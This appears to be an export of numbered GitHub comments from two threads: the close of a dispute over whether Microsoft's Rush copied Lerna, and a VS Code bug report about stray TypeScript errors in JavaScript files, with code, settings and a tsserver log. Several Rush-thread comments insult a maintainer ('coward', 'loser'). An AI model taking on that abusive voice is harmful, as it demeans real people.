Rush's focus is scalability.  For context, my team supports an internal monorepo that now has around 130+ projects and 200+ contributors, many of whom are infrequent participants unfamiliar with our system or indeed each other.  If someone introduces a problematic dependency, or if a dev somewhere encounters a weird build error, or if a CI job starts failing, my team gets a support ticket that disrupts our everyday work.  This shaped the character of Rush.  For example:  We need policies and safeguards for a group our size.  We [publish JSON schemas]( https://github.com/Microsoft/json-schemas) for every config file (which is extra work but helps catch mistakes), and we also strictly validate every command-line option.  Rush still supports NPM but really wants you to use PNPM.  Rush's publishing feature expects you to use specific workflows, and there are something like 5 recommended models that we converged on.  Incremental builds are a big deal for us also, but this imposes requirements on your toolchain to get that feature.  This summer we're hoping to add support for multi-machine sharded builds and multi-phase builds as our repo grows.  Big company stuff I know, but important to us.

So rather than merge all this opinionated stuff into one of the other monorepo tools, we continued with Rush and thought about ways to extend its scenarios beyond SharePoint and Office to help the broader community.  The hope is that Rush will appeal to others who are scaling up and encountering the same problems we did.  We're new to that and still learning.  For example, we've been adding features to make onboarding easier.  We moved the wiki to a web site.  (I drew the art on there myself as you might be able to tell.)  We only recently realized we needed ""how to compile this repo"" instructions.  Rush doesn't receive formal product support or marketing from Microsoft.  As engineers, we benefit from a ton of open source libraries in our everyday jobs, and so we just wanted to give back and participate in the community.  Our day job is still about commercial products.  Like the other tools in the **web-build-tools** repo, Rush filled a gap that we had internally and we think it's cool so we wanted to share it.  But there are definitely plenty of other great choices out there if you have different requirements.
"
3680	"Those sound like good closing remarks to wrap up a conversation in which the initiator has shown no further interest of participating. 

As a bystander I subscribed to this issue out of curiosity and applaud you guys for handling this topic so professionally. "
3681	"Whoever can handle a situation in a more professional and civilized manner should be given the benefit of the doubt. How would stealing code even be wrong if Microsoft did it calmly? A wise man once told me, “I’ll take a tyrant covered in blood and holding a lit match over a hero covered in gasoline any day.”

Long live Microsoft! Bravo team. "
3682	"Context: I’m the creator and license owner of Lerna.

Just want to publicly, and on the record, state that I have no intention to believe that Rush has copied any code from Lerna.

Even if there was, the licenses of the two projects are identical (MIT). In the event that the author field of the license has some signifance, I don’t consider it an issue and would gladly release all liability.

Thank you so much @shanselman for being so diligent!"
3683	"@kittens Amen. I've gone to double check what you've said, and you're 100% right. Actually, I looked around some more and was shocked that most MIT licenses seem to be direct copy-and-paste jobs of one another, with fragments of one line changed. Just goes to show how common the ""photocopy"" approach is here on Github."
3684	"Ok folks. I’m going to close this one down now in the absence of any copyright infringement claim and out of respect for the original poster so that we don’t bombard him with notifications. 

I honestly believe that the original poster believes that this project has at least been heavily inspired by Lerna.

However I also believe that the team have given a good account of the project, their work on it and the lineage of the code that is consistent with all the other data I can find. I also applaud their calmness despite their professionalism being called into question in the comments in some of the reddit and hackernews threads linking to this topic.

However, I am not able to find any evidence of copyright infringement and no claim from any copyright holder therefore I am going close.

I would appeal that folks lay off the original poster a bit. While his communication style may be a bit spicey at times, he has contributed a heck of a lot to the open source community and I applaud anyone who goes to that effort. He was also very quick to reply to me when I contacted him directly despite being away for the weekend and having no clue who I was. My DM’s are always open if he wants to get back in touch. 

If folks have a concern about any of the projects in this org then please contact the project first by raising an issue. If you get no joy there then please email opensource@microsoft.com where there is a team of people ready to help. Also take a look at the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). 

The job of the [Open Source Program Office](https://opensource.microsoft.com) is to ensure that Microsoft do open source right. We are a big company with lots of people of different experience levels so when someone contacts us we tend to assume they are correct and the team is wrong and we help make sure it gets fixed.  More so, we tend to employ the type of people that _enjoy_ being able to find evidence of mistakes and who are able to educate the teams on how to go about things in the right way in the future.

Also feel free to DM me personally on Twitter if you want to chat about any concerns. 

Thanks for your time. 
"
3685	@martinwoodward coward
3686	"actually i gotta lay off here a little bit, because clearly microsoft has made advances in their loser-generating algorithms here wow look:

![](https://i.imgur.com/bWPuu3b.jpg)"
3687	For the record, if you get mail from Github, it was me reporting you for abuse. Have a good day!
3688	@Airblader Yes I was wondering why Microsoft was sending me yet more spam.
3689	"Lets not forget that Microsoft is known for taking inspiration for what happens in the computing community and making their own version.

C# is inspired from what was done with Java.
Parts of .NET Core seem inspired from the node.js event loop and use the same backend library libuv.

There is nothing wrong with this, and many companies start with inspiration and evolve things into something better. 


"
3690	@seand88 Microsoft didn't do anything wrong here. And _even if they did_, there is nothing wrong with that either. What's wrong is saying they did. And what's right is 7.5 BILLION DOLLARS TO BUY ALL OF COMPUTERS AND ONLINE.
3691	Can someone please lock this thread? @martinwoodward? I've reported this user both to Github and Gitlab now. I don't think we can expect anything sane from this point onwards.
3692	@Airblader I agree. they. bought. the. website.
3693	@OKNoah You're kinda coming off as a jerk. Just like you, @martinwoodward is a person...a human being. Labeling someone as a loser isn't going to bring yourself any respect or change anyone's opinion.  It only makes other humans tune you out.
3694	Someone get these folks a link to net-nanny.
3695	@Airblader [in your stupid sounding voice] hello operator please connect me to git please i wanna ban an open source contributo--- yes i did pay 7.5 billion dollars yes please connect me at once
3696	TypeScript powers our javascript language support as well. Please share the text of the code along with screenshots
3697	"I shared screenshots in the first issue message. This errors seems to show in different places, without any logic.
```javascript
while (document.querySelector('.ingredientList').children.length > 0) {
  document.querySelector('.ingredientList').removeChild(document.querySelector('.ingredientList').children[0]);
}
```

The word 'document' is underlined, and [ts] errors says:
**'while' expected,**
**Expression expected,**
**')' expected,**"
3698	I can't repo this. Does this reproduce in the [latest VS Code insiders build](https://code.visualstudio.com/insiders/) with all extensions disabled? Also, do the errors go away if you edit the document? (just try adding whitespace somewhere)
3699	"I have this same problem using do expressions in jsx files.

to reproduce it, use a do expression in jsx syntax.

![image](https://user-images.githubusercontent.com/41075/42888130-8ce8c9ae-8a75-11e8-83d9-0ca71beab887.png)

I get this in the ""problems"" pane:
![image](https://user-images.githubusercontent.com/41075/42888245-d424405a-8a75-11e8-9c7a-0896a119b826.png)


i didn't even have the tslint extension installed, so i've installed it, and then I've tried disabling tslint. I've tried excluding `**/*.js*` files.  it doesn't work.

I've configured my ES lint to ignore do expressions and that's working, but I can't turn off the ts errors in the js files.

I've tried configuring tslint in my preferences as so:

```
{
    ...the rest of my prefs
    ""tslint.exclude""                            : ""**/*.js*"",
    ""tslint.enable""                             : false,
}
```
it doesn't work

I've tried adding a tslint.json to my project with the content:

```
{
  ""rules"": {
    ""no-unused-expression"": false
  }
}
```

it doesn't work.

I've never used my vs code for typescript. Except for the things i've mentioned here, all my ts settings are whatever comes out of the box.

The error occurs with all extensions disabled.

Editing the document makes no difference."
3700	"@davidcoleman007 is absolutely right.

@mjbvz I have a lot of [ts] errors in JSX syntax but also in normal JavaScript code. The error occurs with all extensions disabled. Sometimes when I close document and open it again errors disappears, sometimes not.

"
3701	"@davidcoleman007 Our built-in js support only the current ecmascript standard. If you are using proposed syntax like do notation, at the very least you must set `""javascript.validate.enabled"": false` to disable error reporting on js files. IntelliSense and other language features may also not work. The babel extensions in the marketplace may help too but they do not match our built-in js support feature-wise

@donacellos Please provide a complete example of your code as text"
3702	I too am getting lots of ts errors in my js code. VScode used to be the best editor, now it is a heaping pile of bugs.
3703	@mjbvz Errors are in almost EVERY code in my projects - missing semicolons on comments, missing while operator in the middle on string etc. When I close VS Code they disappears, as I type new stuff they appear again in completely different places. Now, in macOS Activity Monitor, I saw that Code process takes 100% CPU. Next strange behaviour. @marktellez is right.
3704	"@marktellez The example code you shared is invalid JavaScript. The `TS` in the name indicates that the error comes from the Ts extension which powers both JS and TS intellisense. You can disable that error reporting by setting `”javascript.validate.enable”: false`

@donacellos Please provide a complete example of your code as text
"
3705	@mjbvz why do i have to disable the entire feature?  Can't i just turn off THAT error rule.  It's not even typescript.  why do I have to deal with ts lint issues in a JS file?  I have properly configured my eslint to handle do expressions.  TSlint should allow me to do the same, and disable that rule.  As a matter of fact, to my previous point, I should be able to opt to not do ANY tslint-ing in my js files, I like the ts intellisense.  In fact it's one of the most appealing features of the editor.
3706	"@mjbvz  

Example of JS
```javascript
export default () => {
  if (process.env.NODE_ENV !== 'development' && 'serviceWorker' in navigator) {
    window.addEventListener('load', () => {
      navigator.serviceWorker.register('/service-worker.js').then((registration) => {
        console.log('SW registered: ', registration);
      }).catch((registrationError) => {
        console.log('SW registration failed: ', registrationError);
      });
    });
  }
};
```

Example of JSX
```jsx
const App = () => (
  <Provider store={store}>
    <BrowserRouter>
      <Aux>
        <Header />
        <div className=""container"">
          <Switch>
            <Route exact path=""/"" component={RentalList} />
            <Route exact path=""/search/:city"" component={RentalSearchList} />
            <ProtectedRoute exact path=""/create"" component={RentalCreate} />
            <ProtectedRoute exact path=""/manage/rentals"" component={RentalManage} />
            <ProtectedRoute exact path=""/manage/bookings"" component={BookingManage} />
            <LoggedInRoute exact path=""/login"" component={Login} />
            <LoggedInRoute exact path=""/register"" component={Register} />
            <Route exact path=""/rentals/:id"" component={RentalDetail} />
          </Switch>
        </div>
      </Aux>
    </BrowserRouter>
  </Provider>
);
```

You are having troubles with [ts] errors in pure JavaScript? Disable whole JavaScript validation feature. Seems legit, great support."
3707	"lol, I was working for MS in Redmond and Intel in Portland writing com, dcom, com+ and for that matter, javascript before you were even born.

```
const Gene = () => ({
  value: null,
  type: null,
  fitness:  -1,
})

module.exports = Gene
```

is absolutely valid js and a much more concise example than the mess you show.

I uninstalled (deleted the binary) and redownloaded and reinstalled and reinstalled my plugins and the problem went away. Before I uninstalled and reinstalled my extensions weren’t even showing in the extensions pane.

Perhaps you should take input from users instead of blaming them.

Mark Tellez
Technology Consultant
marktellez.com
codementor.io/marktellez


FREE ReactJS Screencasts: https://www.youtube.com/channel/UCx4a8EMmXx-6RuJlyAKASoQ

> On Jul 21, 2018, at 11:01 AM, Donie <notifications@github.com> wrote:
> 
> @marktellez <https://github.com/marktellez>
> Example of JS
> 
> export default () => {
>   if (process.env.NODE_ENV !== 'development' && 'serviceWorker' in navigator) {
>     window.addEventListener('load', () => {
>       navigator.serviceWorker.register('/service-worker.js').then((registration) => {
>         console.log('SW registered: ', registration);
>       }).catch((registrationError) => {
>         console.log('SW registration failed: ', registrationError);
>       });
>     });
>   }
> };
> Example of JSX
> 
> const App = () => (
>   <Provider store={store}>
>     <BrowserRouter>
>       <Aux>
>         <Header />
>         <div className=""container"">
>           <Switch>
>             <Route exact path=""/"" component={RentalList} />
>             <Route exact path=""/search/:city"" component={RentalSearchList} />
>             <ProtectedRoute exact path=""/create"" component={RentalCreate} />
>             <ProtectedRoute exact path=""/manage/rentals"" component={RentalManage} />
>             <ProtectedRoute exact path=""/manage/bookings"" component={BookingManage} />
>             <LoggedInRoute exact path=""/login"" component={Login} />
>             <LoggedInRoute exact path=""/register"" component={Register} />
>             <Route exact path=""/rentals/:id"" component={RentalDetail} />
>           </Switch>
>         </div>
>       </Aux>
>     </BrowserRouter>
>   </Provider>
> );
> You are having troubles with [ts] errors in pure JavaScript? Disable whole JavaScript validation feature. Seems legit, great support.
> 
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub <https://github.com/Microsoft/vscode/issues/54261#issuecomment-406806094>, or mute the thread <https://github.com/notifications/unsubscribe-auth/AVchh_2m7KaTVy8MWRfs2cLfm2gDcidTks5uI1B0gaJpZM4VPBgt>.
> 

"
3708	@davidcoleman007 we cannot provide intellisense if we can’t parse your code. Thats one tradeoff of using experimental language features
3709	@donacellos And that code in a blank file show errors for you? Can you share the code from your original screenshots too
3710	"Also @marktellez, cut it out. I'm just trying to help you. According to github email notifications at least, the first snippet you posted (and then deleted at some point) was:

```ts
const Gene = () = ({
value: null,
type: null,
fitness: -1,
})

export default Gene
```

If you are still seeing problems, open a new issue with your code and I'll take a look

"
3711	"folllowing this convo and I agree that we should keep it professional. We are trying to work towards improving vs code for ourselves and everyone else who uses it.

*steps off soapbox*

@mjbvz is there ANY chance that I could disable the ts unused expressions rule some how, and let the intellisense just not work in those blocks, but work for the rest of the file w/o throwing a bunch of red all over the place?

or maybe there is some api that allows me to build in the code from babel stage 0/1 into vscode to extend it much the way the community has done for eslint?"
3712	"@davidcoleman007 Yes the two settings you want are `""editor.showUnused"": false`  for unused (faded out) variables and `""javascript.validate.enable"": false` to disable all error reporting. IntelliSense will still be enabled but, as I said, we can't guarantee it will work, especially inside of expressions or statements that use experimental syntax "
3713	Thank you.  I will try this when I get a moment over the next day or 2.
3714	"Just wanted to +1 this issue. I've been seeing it for over a month now and haven't been able to hone in on reliable steps to reproduce. Sometimes restarting vscode fixes it for a short period of time, other times it does not. I've tried disabling all extensions but it still happens.

Also, this is a dupe of #53247 which was recently closed (unfortunate) due to lack of STR.

Edit: I'm also finding that the file type doesn't matter. Happens with both Javascript and Javascript React."
3715	"@mjbvz Can't you understand that this is not able to reproduce? Errors appear in random places, random files (JavaScript, JavaScript React, even Markdown sometimes) and random code parts. They sometimes disappears after closing document or adding new character to it, sometimes they don't. Sometimes I have to select all code and simply cut&paste it to get rid of these errors.

My original screenshoots from first issue message - they do not appear anymore. Now they appear in other places. I think @ehynds talks about the same problems."
3716	"This definitely seems to be related to performance issues (memory leak in `electron_node electronForkStart.js tsserver.js`?). The [ts] errors might be valid when they first appear, but as you continue editing the file they ""get stuck"" and the duration for which they are stuck seems to correlate with the amount of memory usage by tsserver.js."
3717	+1 to the issue. Just created index.js and put there `export default from './Wrapper';`. That leads to underlining `'./Wrapper'` with red and gives `[ts] ';' expected` error. Why? Just Why?! And the funniest and saddest thing at the same time that if you put semicolon after  'from' word the error disappear. Cool solution, isn't it? I believe that even integrated linters have to have enable/disable setting for an easy control. Annoying bug to say the least.
3718	"My javascript files are covered in [ts] errors because we use experimentalDecorators, which I have enabled for javascript in the settings. I have disabled every typescript and javascript setting I can find and I haven't been able to open a file without getting blasted with a million [ts] errors since 2 or 3 updates ago. No one on my team has been able to get them to go away either. This is a problem on Windows 10 and Mac (idk what versions). After the first update where this was an issue, I downloaded the nightly build, copied over my settings and installed all my plugins, and it worked just fine. Haven't tried a recent nightly build though.

If I type `bob?.jeff` I'll get `[ts] Expression expected.`

```
""javascript.format.enable"": false,
""javascript.suggestionActions.enabled"": false,
""javascript.validate.enable"": false,
""typescript.format.enable"": false,
""typescript.suggestionActions.enabled"": false,
""typescript.tsc.autoDetect"": ""off"",
""typescript.validate.enable"": false,
""javascript.implicitProjectConfig.experimentalDecorators"": true,
```"
3719	"@JourdanClark , sorry to disappoint you, but that does nothing at all in my case! As if VS Code just ignores those settings! That stubborn & stupid error is still there ((. 

But thanks for interesting point about experimental decorators. Got rid of some errors in other files."
3720	@justintemps Dude, this setting is connected with TSLint extension, this errors appears on default VSCode TS/JS checking.
3721	Im also seeing TS errors across JS files 🤔 I don't have any TS linting extensions installed. 
3722	"@donacellos Please try collecting the TS Server log using VS Code 1.27:

1. Set `""typescript.tsserver.log"": ""verbose"",`
1. Restart VS Code and reproduce the problem
1. In VS Code, run the `TypeScript: Open TS Server log` command
1. This should open a folder with a `tsserver.log` file in it

Please share the log file from a session that had the errors in the wrong place

 > **⚠️Warning:** The TypeScript log may include information from your workspace, including file paths and source code. If you have any concerns about posting this publicly on Github, just let me know and we can arrange something else. On our side, we only use these logs to investigate issues like this"
3723	"This issue has been closed automatically because it needs more information and has not had recent activity. See also our [issue reporting](https://aka.ms/vscodeissuereporting) guidelines.

Happy Coding!"
3724	"@mjbvz Is there a way to disable javascript validation, but preserve the ""showUnused"" functionality? VSCode is throwing a [ts] error because of the :: operator, and I want to kill those, but keep the 'fading out' of unused variables (inherited a messy codebase). I tried `""javascript.validate.enable"": false, ""editor.showUnused"": true` but no go. Otherwise, any suggestion to circumvent that one :: operator error through VSCode.
"
3725	"@garretteklof I finally figured out how to disable the [ts] errors. Go to Extension view, search for `@builtin javascript`, and disable `TypeScript and JavaScript Language Features`. It worked for me anyways.

Edit: Keep in mind that this disables the built in linting. That is fine in my case because I rely on the ESLint plugin to do my linting, but if you don't have something like that set up then you'll probably want to set up ESLint or some other linting tool when you disable what VSCode ships with."
3726	"@JourdanClark thanks a lot for the reply -- that looks like a possible alternative to `""javascript.validate.enable"": false`, but unfortunately does seem to disable the greying out of unused variables/imports too. There may not be a way to isolate the feature."
3727	"@mjbvz Here is the section of my tsserver.log that mentions the [ts] errors. The code I was working on is for an Udemy class on Gulp. Does this shed any light on the scenario? These errors are causing a lot of visual noise and are crowding out actual errors in the code.

I can confirm that when I disable the 'TypeScript and JavaScript Language Features' version 1.0.0 built in extension that the errors go away. However, I really like the JavaScript language features. It would be nice to not pair both languages in the same extension.

Below you can see in the image a bunch of [ts] errors. Some are on the 'require' statement and others on the 'require' parameters.

On a side note, why did this issue close 5 days ago? I see the latest comment before the closing of this ticket was 13 days ago. That means only 8 days passed before this ticket closed.

![image](https://user-images.githubusercontent.com/3253360/45724150-8f017e00-bb69-11e8-8af2-397347bbbc0f.png)


**tsserver.log:**

```
Info 123  [17:10:47.711] event:
    {""seq"":0,""type"":""event"",""event"":""suggestionDiag"",""body"":{""file"":""c:/Users/username/Desktop/gulp-website/gulpfile.js"",""diagnostics"":[{""start"":{""line"":1,""offset"":12},""end"":{""line"":1,""offset"":27},""text"":""File is a CommonJS module; it may be converted to an ES6 module."",""code"":80001,""category"":""suggestion""},{""start"":{""line"":3,""offset"":26},""end"":{""line"":3,""offset"":43},""text"":""Could not find a declaration file for module 'gulp-livereload'. 'c:/Users/username/Desktop/gulp-website/node_modules/gulp-livereload/index.js' implicitly has an 'any' type.\n  Try `npm install @types/gulp-livereload` if it exists or add a new declaration (.d.ts) file containing `declare module 'gulp-livereload';`"",""code"":7016,""category"":""suggestion""},{""start"":{""line"":5,""offset"":5},""end"":{""line"":5,""offset"":14},""text"":""'minifyCss' is declared but its value is never read."",""code"":6133,""category"":""suggestion"",""reportsUnnecessary"":true},{""start"":{""line"":12,""offset"":5},""end"":{""line"":12,""offset"":15},""text"":""'handlebars' is declared but its value is never read."",""code"":6133,""category"":""suggestion"",""reportsUnnecessary"":true},{""start"":{""line"":12,""offset"":26},""end"":{""line"":12,""offset"":43},""text"":""Could not find a declaration file for module 'gulp-handlebars'. 'c:/Users/username/Desktop/gulp-website/node_modules/gulp-handlebars/index.js' implicitly has an 'any' type.\n  Try `npm install @types/gulp-handlebars` if it exists or add a new declaration (.d.ts) file containing `declare module 'gulp-handlebars';`"",""code"":7016,""category"":""suggestion""},{""start"":{""line"":13,""offset"":5},""end"":{""line"":13,""offset"":18},""text"":""'handlebarsLib' is declared but its value is never read."",""code"":6133,""category"":""suggestion"",""reportsUnnecessary"":true},{""start"":{""line"":14,""offset"":5},""end"":{""line"":14,""offset"":12},""text"":""'declare' is declared but its value is never read."",""code"":6133,""category"":""suggestion"",""reportsUnnecessary"":true},{""start"":{""line"":14,""offset"":23},""end"":{""line"":14,""offset"":37},""text"":""Could not find a declaration file for module 'gulp-declare'. 'c:/Users/username/Desktop/gulp-website/node_modules/gulp-declare/index.js' implicitly has an 'any' type.\n  Try `npm install @types/gulp-declare` if it exists or add a new declaration (.d.ts) file containing `declare module 'gulp-declare';`"",""code"":7016,""category"":""suggestion""},{""start"":{""line"":15,""offset"":5},""end"":{""line"":15,""offset"":9},""text"":""'wrap' is declared but its value is never read."",""code"":6133,""category"":""suggestion"",""reportsUnnecessary"":true},{""start"":{""line"":15,""offset"":20},""end"":{""line"":15,""offset"":31},""text"":""Could not find a declaration file for module 'gulp-wrap'. 'c:/Users/username/Desktop/gulp-website/node_modules/gulp-wrap/index.js' implicitly has an 'any' type.\n  Try `npm install @types/gulp-wrap` if it exists or add a new declaration (.d.ts) file containing `declare module 'gulp-wrap';`"",""code"":7016,""category"":""suggestion""}]}}
Info 124  [17:10:47.712] event:
    {""seq"":0,""type"":""event"",""event"":""requestCompleted"",""body"":{""request_seq"":8}}
Info 125  [17:10:51.410] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 126  [17:10:51.546] Elapsed:: 136ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 127  [17:10:51.546] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 128  [17:10:51.546] Elapsed:: 0ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 129  [17:10:51.546] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b/README.md :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 130  [17:10:51.546] Elapsed:: 0ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b/README.md :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 131  [17:10:51.546] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b/index.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 132  [17:10:51.624] Elapsed:: 78ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b/index.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 133  [17:10:51.625] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b/package.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 134  [17:10:51.690] Elapsed:: 65ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b/package.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 135  [17:10:51.691] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/README.md :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 136  [17:10:51.691] Elapsed:: 0ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/README.md :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 137  [17:10:51.691] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/index.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 138  [17:10:51.763] Elapsed:: 72ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/index.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 139  [17:10:51.763] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 140  [17:10:51.827] Elapsed:: 64ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 141  [17:10:51.827] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 142  [17:10:52.5] Elapsed:: 178ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 143  [17:10:52.5] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 144  [17:10:52.5] Elapsed:: 0ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging/types-registry-1a62120b :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 145  [17:10:52.7] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 146  [17:10:52.195] Elapsed:: 188ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 147  [17:10:52.196] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json.4073882689 :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 148  [17:10:52.196] Elapsed:: 0ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json.4073882689 :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 149  [17:10:52.198] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 150  [17:10:52.299] Elapsed:: 101ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 151  [17:10:52.299] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json.4073882689 :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 152  [17:10:52.299] Elapsed:: 0ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json.4073882689 :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 153  [17:10:52.301] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 154  [17:10:52.359] Elapsed:: 58ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/types-registry/package.json :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
